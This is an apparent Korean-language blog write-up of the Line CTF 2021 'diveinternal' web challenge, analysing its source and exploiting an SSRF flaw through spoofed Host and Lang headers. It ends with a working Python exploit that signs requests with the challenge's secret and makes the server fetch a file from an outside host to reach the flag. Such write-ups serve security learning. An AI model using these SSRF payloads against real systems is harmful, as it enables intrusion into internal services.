---
layout: post
date: 2021-03-14 00:00:11
title: "Line CTF 2021 Write Up"
categories: CTF
tags: [SSRF]
author:
  - Jeongwon Jo

---
## <span style="color:#21C587"></span> (Web) diveinternal [50 pts]

> diveinternal challenge is get the flag using ssrf vuln

This time i will write only important part

```javascript
var express = require('express');
var request = require('request');
var querystring = require('querystring');

var router = express.Router();

if (process.env.NODE_ENV == 'local') { //set the environment value before your running this app
  require('dotenv').config();
}


var target = process.env.TARGET_HOST;
var test = process.env.TEST;



/* GET home page. */
router.get('/', function(req, res, next) {
  request({
    headers: req.headers,
    uri: `http://${target}/`,
  }, function(err, data){
    res.render('index', { title: 'apis' , data: data.body});
  });
  
});


router.get('/coin', function(req, res, next) {
  request({
        headers: req.headers,
        uri: `http://${target}/coin`,
      }).pipe(res);
  });

  router.get('/addsub', function(req, res, next) {
    request({
          
          uri: `http://${target}/addsub`,
          qs: {
            email: req.query.email,
          }
        }).pipe(res);
    });
  
module.exports = router;
```
위 코드는 `api`인데 `${target}`의 값을 이용해서 요청 보내는 것을 볼 수 있습니다.

```
TEST=test
TARGET_HOST=localhost:5050
```
또한 `TARGET_HOST`의 값은 로컬호스트인 것을 보아 내부 서버로 요청을 보내는 것을 알 수 있습니다.

```
FROM node:lts-alpine as base

ADD ./src /src
WORKDIR /src
COPY /src/package*.json /
EXPOSE 3000

FROM base as production
ENV NODE_ENV=production
ENV TARGET_HOST=private:5000
RUN npm install -g nodemon && npm install
RUN npm ci
COPY . /
CMD ["node", "bin/www"]

FROM base as dev
ENV NODE_ENV=development
ENV DEBUG=frontend:*
ENV TARGET_HOST=private:5000
RUN npm install -g nodemon && npm install
COPY . /
CMD ["nodemon", "bin/www"]

FROM base as local
ENV NODE_ENV=development
ENV DEBUG=frontend:*
ENV TARGET_HOST=localhost:5050
RUN npm install -g nodemon && npm install
COPY . /
CMD ["nodemon", "bin/www"]
```
도커 파일을 확인해보면 `5050` 포트만 열려 있는 건 아니고, `5000`번 포트도 열려 있는 것을 볼 수 있습니다. 즉, 사용할 수 있는 내부 서버는 localhost:5050, localhost:5000 총 2개가 존재합니다.

```python
def RunRollbackDB(dbhash):
    try:
        if os.environ['ENV'] == 'LOCAL':
            return
        if dbhash is None:
            return "dbhash is None"
        dbhash = ''.join(e for e in dbhash if e.isalnum())
        if os.path.isfile('backup/'+dbhash):
            with open('FLAG', 'r') as f:
                flag = f.read()
                return flag
        else:
            return "Where is file?"
```
그리고 일단 제일 중요한 플래그를 읽는 조건을 보면 현재 서버의 환경변수가 `LOCAL`이 아니여야하고, `'backup/' + dbahsh`라는 파일이 존재한다면 `FLAG` 파일을 읽고, 반환해주는 것을 볼 수 있습니다. 

```python
@app.route('/coin', methods=['GET'])
def coin():
    try:
        response = app.response_class()
        language = LanguageNomarize(request)
        response.headers["Lang"] =  language
        data = getCoinInfo()
        response.data = json.dumps(data)
        return response
    except Exception as e :
        err = 'Error On  {f} : {c}, Message, {m}, Error on line {l}'.format(f = sys._getframe().f_code.co_name ,c = type(e).__name__, m = str(e), l = sys.exc_info()[-1].tb_lineno)
        logger.error(err)
```
첫 번째로 `api` 서버에서 `/coin`으로 요청을 보내면 `LanguageNomarize()` 함수의 반환 값을 `Lang`이라는 헤더에 넣어주고, `getCoinInfo()` 함수를 이용해서 코인의 정보를 가져와 응답해주는 것을 볼 수 있습니다.

```python
def LanguageNomarize(request):
    if request.headers.get('Lang') is None:
        return "en"
    else:
        regex = '^[!@#$\\/.].*/.*' # Easy~~
        language = request.headers.get('Lang')
        language = re.sub(r'%00|%0d|%0a|[!@#$^]|\.\./', '', language)
        if re.search(regex,language):
            return request.headers.get('Lang')
        
        try:
            data = requests.get(request.host_url+language, headers=request.headers)
            if data.status_code == 200:
                return data.text
            else:
                return request.headers.get('Lang')
        except:
            return request.headers.get('Lang')
```
`LanguageNomarize()` 함수를 보면 `Lang`이라는 헤더가 존재하면 헤더의 값을 정규식으로 검사를 하고, `requests.get()` 함수를 이용해서 요청을 보내는 것을 볼 수 있습니다. 여기서 `request.host_url`과 `language`의 값은 우리가 조작할 수 있기 때문에 원하는 곳으로 요청을 보낼 수 있기 때문에 SSRF 취약점이 발생합니다.

```python
@app.route('/integrityStatus', methods=['GET'])
def integritycheck():
    data = {'db':'database/master.db','dbhash':activity.dbHash}
    data = json.dumps(data)
    return data
```
두 번째는 `/integrityStatus`를 확인해보겠습니다. 해당 경로로는 `api` 서버와 통신하지 않기 때문에 우리가 일반적으로는 요청을 보낼 수 없습니다. 하지만 SSRF 취약점을 이용하면 `/integrityStatus`로 요청을 해서 `dbhash`의 값을 알아낼 수 있습니다.

```python
@app.route('/rollback', methods=['GET'])
def rollback():
    try:
        if request.headers.get('Sign') == None:
            return json.dumps(status['sign'])
        else:
            if SignCheck(request):
                pass
            else:
                return json.dumps(status['sign'])

        if request.headers.get('Key') == None:
            return json.dumps(status['key'])
        result  = activity.IntegrityCheck(request.headers.get('Key'),request.args.get('dbhash'))
        return result
    except Exception as e :
        err = 'Error On  {f} : {c}, Message, {m}, Error on line {l}'.format(f = sys._getframe().f_code.co_name ,c = type(e).__name__, m = str(e), l = sys.exc_info()[-1].tb_lineno)
        logger.error(err)
        return json.dumps(status['error']), 404
```
세 번째는 `/rollback`을 보면 `SignCheck()`의 값이 참이고, `Key`라는 헤더 값이 존재하면 `IntegrityCheck()` 메서드를 호출하는 것을 볼 수 있습니다.

```python
    def IntegrityCheck(self,key, dbHash): 

        if self.integrityKey == key:
            pass
        else:
            return json.dumps(status['key'])
        if self.dbHash != dbHash:
            flag = RunRollbackDB(dbHash)
            logger.debug('DB File changed!!'+dbHash)
            file = open(os.environ['DBFILE'],'rb').read()
            self.dbHash = hashlib.md5(file).hexdigest()
            self.integrityKey = hashlib.sha512((self.dbHash).encode('ascii')).hexdigest()
            return flag
        return "DB is safe!"
```
`IntegrityCheck()` 메서드를 보면 `self.integrityKey`의 값과 `Key`의 값이 동일하고, `self.dbHash` 값과 `dbHash`의 값이 동일 하지 않으면 `RunRollbackDB()` 함수를 실행시켜 주는 것을 볼 수 있습니다.

```python
def RunRollbackDB(dbhash):
    try:
        if os.environ['ENV'] == 'LOCAL':
            return
        if dbhash is None:
            return "dbhash is None"
        dbhash = ''.join(e for e in dbhash if e.isalnum())
        if os.path.isfile('backup/'+dbhash):
            with open('FLAG', 'r') as f:
                flag = f.read()
                return flag
        else:
            return "Where is file?"
                
    except Exception as e :
        logger.error('Error On  {f} : {c}, Message, {m}, Error on line {l}'.format(f = sys._getframe().f_code.co_name ,c = type(e).__name__, m = str(e), l = sys.exc_info()[-1].tb_lineno))
        return "exception!!"
        pass
```
`RunRollbackDB()`는 아까 위에서 봤다 시피 `backup/dbhash` 파일이 존재하면 `FLAG` 파일을 읽고, 반환해주는 함수입니다. 

그래서 처음에는 다음과 같은 시나리오를 세웠었습니다.

- 시나리오 1
1. SSRF 취약점을 이용해서 `/integrityStatus`로 요청을 보내 `dbHash`의 값을 가져옴
2. 가져온 dbHash 값을 이용해서 `/rollback`으로 요청을 보내서 FLAG를 읽음
3. FLAG는 `lang`이라는 헤더 값으로 반환이 됨

하지만 위 시나리오를 이용해서 익스를 하려 했지만 `IntegrityCheck()` 함수에서 `self.dbHash`의 값과 `dbHash`의 값이 동일해야 하기 때문에 공격을 할 수 없었습니다.

```python
def WriteFile(url):
    local_filename = url.split('/')[-1]
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        with open('backup/'+local_filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192): 
                f.write(chunk)
```
그래서 다시 코드를 분석해보니, `WriteFile()` 함수를 이용해서 `backup/` 아래에 파일을 만들어주는 것을 볼 수 있었습니다. 그래서 `WriteFile` 함수를 이용해서 아무 파일을 하나 생성해주고, 해당 파일의 이름을 `dbHash`로 전송해주면 클래스 내에 있는 변수인 `self.dbHash`의 값과 동일하지 않고, 또 `backup/` 아래에 존재하기 때문에 충분히 우회해서 플래그를 읽을 수 있습니다.

`WriteFile()` 함수 내부를 보면  `requests.get()` 함수를 이용해서 요청을 보내고, `url.split('/')[-1]`의 값을 파일 이름으로 사용해 생성하고 있습니다.

```python
@app.route('/download', methods=['GET','POST'])
def download():
    try:
        if request.headers.get('Sign') == None:
            return json.dumps(status['sign'])
        else:
            if SignCheck(request):
                pass
            else:
                return json.dumps(status['sign'])

        if request.method == 'GET':
            src = request.args.get('src')

            if valid_download(src):
                pass
            else:
                return json.dumps(status.get('false'))
                
        elif request.method == 'POST':
            if valid_download(request.form['src']):
                pass
            else:
                return json.dumps(status.get('false'))

        WriteFile(src)
        return json.dumps(status.get('success'))
```
`WriteFile()` 함수는 `/download`에서 호출을 하는데 이때, `Sign`이라는 헤더 값이 존재하고, `SignCheck()` 함수의 반환 값이 참이고, `src` 파리미터의 값이 존재하면 `WriteFile()` 함수를 실행시켜줍니다.

- 시나리오 2
1. SSRF 취약점을 이용해서 /download로 요청을 보내서 임의의 파일을 생성함.
2. 또 다시 SSRF 취약점을 이용해서 /rollback로 요청을 보내 `FLAG`를 읽음 
3. 이때 해당 파일의 이름을 이용해서 `self.dbHash != dbHash` 구문을 우회함.
4. 마지막으로 `lang` 헤더를 읽으면 됨.

- 주의점
1. 파일을 생성할 때, `requests.get()` 함수를 이용해서 요청을 보내기 때문에 파일을 만들 때, `URL`을 전송해서 만들어주어야 함.
2. `RunRollbackDB()` 함수 내에서 `dbHash`의 값을 한 번 더 파싱하는데, 이때 `e.isalnum()`의 값이 참이어야 함.
3. 플래그를 읽을 때, 환경 변수 `ENV`의 값이 `Local`이 아니여야 하기 때문에 `5050` 포트가 아닌 `5000` 포트를 사용해주어야 함.

```python
import hmac
import hashlib
import requests

url = 'http://35.200.63.50/apis/'

Key = hashlib.sha512(('ed05a1c7ff6428dcf8d50901b6e78ba3').encode('ascii')).hexdigest()
print('[+] Key  : ' + Key)

def sign(KEY):
    privateKey = b'let\'sbitcorinparty'
    EN = hmac.new( privateKey , KEY.encode('utf-8'), hashlib.sha512 )
    return EN.hexdigest()

def integrityStatus():
    headers = {'Host':'localhost:5000', 'Lang':'/integrityStatus'}
    res = requests.get(url+'coin', headers=headers)
    print('[+] headers in /apis/integreityStatus : ' + res.headers['lang'])

def download():
    headers = {'Host':'localhost:5000', 'Lang':'download?src=http://141.164.52.207/a123', 'Sign':sign('src=http://141.164.52.207/a123')}
    res = requests.get(url+'coin', headers=headers)
    print('[+] headers in /apis/download : ' + res.headers['lang'])

def rollback():
    headers = {'Host':'localhost:5000', 'Lang':'/rollback?dbhash=a123', 'Sign':sign('dbhash=a123'), 'Key':Key}
    res = requests.get(url+'coin', headers=headers)
    print('[+] headers in /apis/rollback : ' + res.headers['lang'])

if __name__ == '__main__':
    integrityStatus()
    download()
    rollback()
```

> FLAG is LINECTF{YOUNGCHAYOUNGCHABITCOINADAMYMONEYISBURNING}

---
